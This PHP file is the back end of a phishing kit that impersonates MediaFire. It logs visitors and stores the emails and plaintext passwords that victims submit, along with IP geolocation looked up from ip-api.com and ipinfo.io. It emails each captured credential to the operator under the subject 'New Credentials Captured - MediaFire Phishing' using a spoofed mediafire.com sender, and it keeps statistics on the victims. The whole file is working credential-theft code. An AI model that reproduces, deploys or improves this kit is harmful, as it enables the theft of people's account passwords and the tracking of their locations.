<?php
require_once __DIR__ . '/config.php';

// =============================================
// GEOLOCATION FUNCTION (Gratis, ip-api.com)
// =============================================

function get_geolocation($ip) {
    if ($ip === 'Unknown' || $ip === '127.0.0.1' || $ip === '::1') {
        return [
            'ip' => $ip,
            'country' => 'Local',
            'region' => 'Local',
            'city' => 'Local',
            'zip' => '00000',
            'lat' => 0,
            'lon' => 0,
            'isp' => 'Local',
            'org' => 'Local',
            'proxy' => false,
            'hosting' => false
        ];
    }

    // Use ip-api.com (free, no API key)
    $url = "http://ip-api.com/json/{$ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting";

    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200) {
            $data = json_decode($response, true);
            if ($data && $data['status'] === 'success') {
                return [
                    'ip' => $ip,
                    'country' => $data['country'] ?? 'Unknown',
                    'country_code' => $data['countryCode'] ?? '??',
                    'region' => $data['regionName'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'zip' => $data['zip'] ?? '00000',
                    'lat' => $data['lat'] ?? 0,
                    'lon' => $data['lon'] ?? 0,
                    'timezone' => $data['timezone'] ?? 'UTC',
                    'isp' => $data['isp'] ?? 'Unknown',
                    'org' => $data['org'] ?? 'Unknown',
                    'as' => $data['as'] ?? 'Unknown',
                    'proxy' => $data['proxy'] ?? false,
                    'hosting' => $data['hosting'] ?? false
                ];
            }
        }

        // Fallback: ipinfo.io (also free, but rate limited)
        $url2 = "https://ipinfo.io/{$ip}/json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);

        $response2 = curl_exec($ch);
        curl_close($ch);

        $data2 = json_decode($response2, true);
        if ($data2) {
            $loc = explode(',', $data2['loc'] ?? '0,0');
            return [
                'ip' => $ip,
                'country' => $data2['country'] ?? 'Unknown',
                'country_code' => $data2['country'] ?? '??',
                'region' => $data2['region'] ?? 'Unknown',
                'city' => $data2['city'] ?? 'Unknown',
                'zip' => $data2['postal'] ?? '00000',
                'lat' => $loc[0] ?? 0,
                'lon' => $loc[1] ?? 0,
                'timezone' => $data2['timezone'] ?? 'UTC',
                'isp' => $data2['org'] ?? 'Unknown',
                'org' => $data2['org'] ?? 'Unknown',
                'proxy' => false,
                'hosting' => false
            ];
        }

        return [
            'ip' => $ip,
            'country' => 'Unknown',
            'region' => 'Unknown',
            'city' => 'Unknown',
            'zip' => '00000',
            'lat' => 0,
            'lon' => 0,
            'isp' => 'Unknown',
            'org' => 'Unknown'
        ];
    } catch (Exception $e) {
        return [
            'ip' => $ip,
            'country' => 'Unknown',
            'region' => 'Unknown',
            'city' => 'Unknown',
            'zip' => '00000',
            'lat' => 0,
            'lon' => 0,
            'isp' => 'Unknown',
            'org' => 'Unknown'
        ];
    }
}

// =============================================
// HELPER FUNCTIONS
// =============================================

function sanitize_input($data) {
    if (is_array($data)) {
        return array_map('sanitize_input', $data);
    }
    return htmlspecialchars(strip_tags(trim($data)), ENT_QUOTES, 'UTF-8');
}

function validate_email($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

function validate_password($password) {
    if (strlen($password) < 8) {
        return ['valid' => false, 'message' => 'Password must be at least 8 characters long.'];
    }
    if (!preg_match('/[A-Za-z]/', $password)) {
        return ['valid' => false, 'message' => 'Password must contain at least one letter.'];
    }
    if (!preg_match('/[0-9]/', $password)) {
        return ['valid' => false, 'message' => 'Password must contain at least one number.'];
    }
    return ['valid' => true, 'message' => ''];
}

function log_visitor($page) {
    try {
        $db = new SQLite3(DB_PATH);
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

        $geoData = GEOLOCATION_ENABLED ? get_geolocation($ip) : null;

        $stmt = $db->prepare("INSERT INTO visitors (ip_address, user_agent, page_visited, country, city) VALUES (:ip, :agent, :page, :country, :city)");
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $stmt->bindValue(':agent', $userAgent, SQLITE3_TEXT);
        $stmt->bindValue(':page', $page, SQLITE3_TEXT);
        $stmt->bindValue(':country', $geoData['country'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->bindValue(':city', $geoData['city'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->execute();
        $db->close();
    } catch (Exception $e) {
        error_log("Visitor logging error: " . $e->getMessage());
    }
}

function save_credentials($email, $password, $login_type) {
    try {
        $db = new SQLite3(DB_PATH);
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

        // Get geolocation data
        $geoData = GEOLOCATION_ENABLED ? get_geolocation($ip) : null;

        $stmt = $db->prepare("
            INSERT INTO credentials (
                email, password, login_type, ip_address, user_agent,
                country, region, city, zip_code, latitude, longitude,
                isp, organization, proxy, hosting, timezone
            ) VALUES (
                :email, :password, :type, :ip, :agent,
                :country, :region, :city, :zip, :lat, :lon,
                :isp, :org, :proxy, :hosting, :timezone
            )
        ");
        $stmt->bindValue(':email', $email, SQLITE3_TEXT);
        $stmt->bindValue(':password', $password, SQLITE3_TEXT);
        $stmt->bindValue(':type', $login_type, SQLITE3_TEXT);
        $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
        $stmt->bindValue(':agent', $userAgent, SQLITE3_TEXT);
        $stmt->bindValue(':country', $geoData['country'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->bindValue(':region', $geoData['region'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->bindValue(':city', $geoData['city'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->bindValue(':zip', $geoData['zip'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->bindValue(':lat', $geoData['lat'] ?? 0, SQLITE3_TEXT);
        $stmt->bindValue(':lon', $geoData['lon'] ?? 0, SQLITE3_TEXT);
        $stmt->bindValue(':isp', $geoData['isp'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->bindValue(':org', $geoData['org'] ?? 'Unknown', SQLITE3_TEXT);
        $stmt->bindValue(':proxy', $geoData['proxy'] ? 1 : 0, SQLITE3_INTEGER);
        $stmt->bindValue(':hosting', $geoData['hosting'] ? 1 : 0, SQLITE3_INTEGER);
        $stmt->bindValue(':timezone', $geoData['timezone'] ?? 'UTC', SQLITE3_TEXT);
        $stmt->execute();

        // Get current admin email
        $settings = get_settings();
        $admin_email = $settings['admin_email'] ?? DEFAULT_ADMIN_EMAIL;

        // Send email notification
        send_email_notification($email, $password, $login_type, $admin_email, $geoData);

        $db->close();
        return true;
    } catch (Exception $e) {
        error_log("Credentials save error: " . $e->getMessage());
        return false;
    }
}

function get_settings() {
    try {
        $db = new SQLite3(DB_PATH);
        $stmt = $db->prepare("SELECT admin_email, admin_token FROM settings LIMIT 1");
        $result = $stmt->execute();
        $row = $result->fetchArray(SQLITE3_ASSOC);
        $db->close();
        return $row ?: ['admin_email' => DEFAULT_ADMIN_EMAIL, 'admin_token' => DEFAULT_ADMIN_TOKEN];
    } catch (Exception $e) {
        error_log("Settings fetch error: " . $e->getMessage());
        return ['admin_email' => DEFAULT_ADMIN_EMAIL, 'admin_token' => DEFAULT_ADMIN_TOKEN];
    }
}

function update_settings($email, $token) {
    try {
        $db = new SQLite3(DB_PATH);
        $stmt = $db->prepare("UPDATE settings SET admin_email = :email, admin_token = :token, updated_at = CURRENT_TIMESTAMP WHERE id = 1");
        $stmt->bindValue(':email', $email, SQLITE3_TEXT);
        $stmt->bindValue(':token', $token, SQLITE3_TEXT);
        $stmt->execute();
        $db->close();
        return true;
    } catch (Exception $e) {
        error_log("Settings update error: " . $e->getMessage());
        return false;
    }
}

function send_email_notification($email, $password, $login_type, $admin_email, $geoData = null) {
    if (!SMTP_ENABLED) {
        // Use PHP mail() as fallback
        $subject = "New Credentials Captured - MediaFire Phishing";
        
        $message = "========================================\n";
        $message .= "NEW CREDENTIALS CAPTURED\n";
        $message .= "========================================\n\n";
        $message .= "Login Type: $login_type\n";
        $message .= "Email: $email\n";
        $message .= "Password: $password\n\n";

        if ($geoData) {
            $message .= "GEOLOCATION DATA:\n";
            $message .= "IP: " . ($geoData['ip'] ?? 'Unknown') . "\n";
            $message .= "Country: " . ($geoData['country'] ?? 'Unknown') . " (" . ($geoData['country_code'] ?? '??') . ")\n";
            $message .= "Region: " . ($geoData['region'] ?? 'Unknown') . "\n";
            $message .= "City: " . ($geoData['city'] ?? 'Unknown') . "\n";
            $message .= "ZIP: " . ($geoData['zip'] ?? 'Unknown') . "\n";
            $message .= "Coordinates: " . ($geoData['lat'] ?? 0) . ", " . ($geoData['lon'] ?? 0) . "\n";
            $message .= "ISP: " . ($geoData['isp'] ?? 'Unknown') . "\n";
            $message .= "Organization: " . ($geoData['org'] ?? 'Unknown') . "\n";
            $message .= "Timezone: " . ($geoData['timezone'] ?? 'Unknown') . "\n";
            $message .= "Proxy: " . ($geoData['proxy'] ? 'YES' : 'No') . "\n";
            $message .= "Hosting: " . ($geoData['hosting'] ? 'YES' : 'No') . "\n\n";
        }

        $message .= "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
        $message .= "IP Address: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
        $message .= "========================================\n";

        $headers = "From: MediaFire Phishing <noreply@mediafire.com>\r\n";
        $headers .= "Reply-To: $admin_email\r\n";
        $headers .= "X-Priority: 1\r\n";

        @mail($admin_email, $subject, $message, $headers);
        return;
    }

    // Use SMTP (require PHPMailer)
    try {
        require_once __DIR__ . '/../../vendor/autoload.php';
        $mail = new PHPMailer\PHPMailer\PHPMailer(true);

        $mail->isSMTP();
        $mail->Host = SMTP_HOST;
        $mail->Port = SMTP_PORT;
        $mail->SMTPAuth = true;
        $mail->Username = SMTP_USER;
        $mail->Password = SMTP_PASS;
        $mail->SMTPSecure = SMTP_SECURE;

        $mail->setFrom('noreply@mediafire.com', 'MediaFire Phishing');
        $mail->addAddress($admin_email);

        $mail->Subject = 'New Credentials Captured - MediaFire Phishing';

        $body = "NEW CREDENTIALS CAPTURED\n\n";
        $body .= "Login Type: $login_type\n";
        $body .= "Email: $email\n";
        $body .= "Password: $password\n\n";

        if ($geoData) {
            $body .= "GEOLOCATION DATA:\n";
            $body .= "IP: " . ($geoData['ip'] ?? 'Unknown') . "\n";
            $body .= "Country: " . ($geoData['country'] ?? 'Unknown') . "\n";
            $body .= "City: " . ($geoData['city'] ?? 'Unknown') . "\n";
            $body .= "Coordinates: " . ($geoData['lat'] ?? 0) . ", " . ($geoData['lon'] ?? 0) . "\n";
            $body .= "ISP: " . ($geoData['isp'] ?? 'Unknown') . "\n";
        }

        $body .= "\nTime: " . date('Y-m-d H:i:s');

        $mail->Body = $body;

        $mail->send();
    } catch (Exception $e) {
        error_log("SMTP Error: " . $mail->ErrorInfo);
    }
}

function get_statistics() {
    try {
        $db = new SQLite3(DB_PATH);

        // Total visitors
        $result = $db->query("SELECT COUNT(*) as total FROM visitors");
        $row = $result->fetchArray(SQLITE3_ASSOC);
        $total_visitors = $row['total'];

        // Total credentials
        $result = $db->query("SELECT COUNT(*) as total FROM credentials");
        $row = $result->fetchArray(SQLITE3_ASSOC);
        $total_credentials = $row['total'];

        // Recent submissions (last 10, with partial password)
        $result = $db->query("
            SELECT 
                id, email, SUBSTR(password, 1, 3) || '...' as password, 
                login_type, ip_address, country, city, created_at 
            FROM credentials 
            ORDER BY created_at DESC LIMIT 10
        ");
        $recent_submissions = [];
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $recent_submissions[] = $row;
        }

        // Credentials by type
        $result = $db->query("SELECT login_type, COUNT(*) as count FROM credentials GROUP BY login_type");
        $by_type = [];
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $by_type[$row['login_type']] = (int)$row['count'];
        }

        // Credentials by country
        $result = $db->query("SELECT country, COUNT(*) as count FROM credentials WHERE country != 'Unknown' GROUP BY country ORDER BY count DESC LIMIT 5");
        $by_country = [];
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $by_country[$row['country']] = (int)$row['count'];
        }

        $db->close();

        return [
            'total_visitors' => $total_visitors,
            'total_credentials' => $total_credentials,
            'recent_submissions' => $recent_submissions,
            'by_type' => $by_type,
            'by_country' => $by_country
        ];
    } catch (Exception $e) {
        error_log("Stats error: " . $e->getMessage());
        return [
            'total_visitors' => 0,
            'total_credentials' => 0,
            'recent_submissions' => [],
            'by_type' => [],
            'by_country' => []
        ];
    }
}

function get_files() {
    try {
        $db = new SQLite3(DB_PATH);
        $result = $db->query("SELECT * FROM files ORDER BY created_at DESC");
        $files = [];
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $files[] = $row;
        }
        $db->close();
        return $files;
    } catch (Exception $e) {
        error_log("Files fetch error: " . $e->getMessage());
        return [];
    }
}

function add_file($name, $type, $size, $icon) {
    try {
        $db = new SQLite3(DB_PATH);
        $stmt = $db->prepare("INSERT INTO files (name, type, size, icon) VALUES (:name, :type, :size, :icon)");
        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
        $stmt->bindValue(':type', $type, SQLITE3_TEXT);
        $stmt->bindValue(':size', $size, SQLITE3_TEXT);
        $stmt->bindValue(':icon', $icon, SQLITE3_TEXT);
        $stmt->execute();
        $db->close();
        return true;
    } catch (Exception $e) {
        error_log("File add error: " . $e->getMessage());
        return false;
    }
}

function update_file($id, $name, $type, $size, $icon) {
    try {
        $db = new SQLite3(DB_PATH);
        $stmt = $db->prepare("UPDATE files SET name = :name, type = :type, size = :size, icon = :icon WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
        $stmt->bindValue(':type', $type, SQLITE3_TEXT);
        $stmt->bindValue(':size', $size, SQLITE3_TEXT);
        $stmt->bindValue(':icon', $icon, SQLITE3_TEXT);
        $stmt->execute();
        $db->close();
        return true;
    } catch (Exception $e) {
        error_log("File update error: " . $e->getMessage());
        return false;
    }
}

function delete_file($id) {
    try {
        $db = new SQLite3(DB_PATH);
        $stmt = $db->prepare("DELETE FROM files WHERE id = :id");
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $stmt->execute();
        $db->close();
        return true;
    } catch (Exception $e) {
        error_log("File delete error: " . $e->getMessage());
        return false;
    }
}

function authenticate_admin($token) {
    $settings = get_settings();
    return $token === $settings['admin_token'];
}
?>